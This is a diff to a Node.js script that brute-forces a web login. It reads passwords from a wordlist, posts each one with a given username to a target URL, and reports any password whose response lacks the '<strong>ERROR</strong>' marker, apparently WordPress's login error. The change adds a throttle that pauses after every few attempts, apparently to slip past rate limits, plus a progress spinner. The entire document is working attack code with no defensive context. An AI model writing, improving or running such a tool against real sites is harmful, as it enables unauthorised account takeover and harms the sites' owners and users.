@@ -7,6 +7,7 @@ const querystring = require('querystring');
 const url = process.argv[2];
 const username = process.argv[3];
 const listFilePath = process.argv[4];
+const chunkToWait = process.argv[5] || 4;
 
 function nextLine(text, prev) {
   let line = prev;
@@ -56,39 +57,52 @@ function makeRequest(password) {
   })
     .then(data => {
       if (!data.includes('<strong>ERROR</strong>')) {
-        console.log('username: ' + username + 'password: ' + password);
+        process.stdout.write(`\rusername: ${username}password: ${password}\n`);
       }
     })
     .catch(error => console.error(error));
 }
 
-const stream = fs.createReadStream(listFilePath);
-const tries = new Promise((resolve) => {
-  let extraText = '';
-  stream.on('data', (chunk) => {
+function start() {
+  const P = ["\\", "|", "/", "-"];
+  let x = 0;
 
-    chunk = chunk.toString();
-    let {text, line, valid} = nextLine(chunk, extraText);
-    chunk = text;
-    while (valid) {
-      extraText = '';
-      makeRequest(line);
+  const stream = fs.createReadStream(listFilePath);
+  new Promise((resolve) => {
+    let extraText = '';
+    stream.on('data', (chunk) => {
 
-      let res = nextLine(chunk, extraText);
-      line = res.line;
-      valid = res.valid;
-      chunk = res.text;
-    }
-    if (!valid) {
-      extraText = line;
-    } else {
-      extraText = '';
-    }
+      chunk = chunk.toString();
+      let {text, line, valid} = nextLine(chunk, extraText);
+      chunk = text;
+      while (valid) {
+        extraText = '';
+        makeRequest(line);
+
+        process.stdout.write(`\r${P[(x++) % 4]} - ${x}`);
+        x++;
+
+        if (x % chunkToWait == 0) {
+          const waitTill = new Date(new Date().getTime() + 1000);
+          while(waitTill > new Date()){}
+        }
+
+        let res = nextLine(chunk, extraText);
+        line = res.line;
+        valid = res.valid;
+        chunk = res.text;
+      }
+      if (!valid) {
+        extraText = line;
+      } else {
+        extraText = '';
+      }
+    });
+
+    stream.on('close', (data) => {
+      resolve();
+    });
   });
+}
 
-  stream.on('close', (data) => {
-    resolve();
-  });
-});
-
-tries.then();
+start();
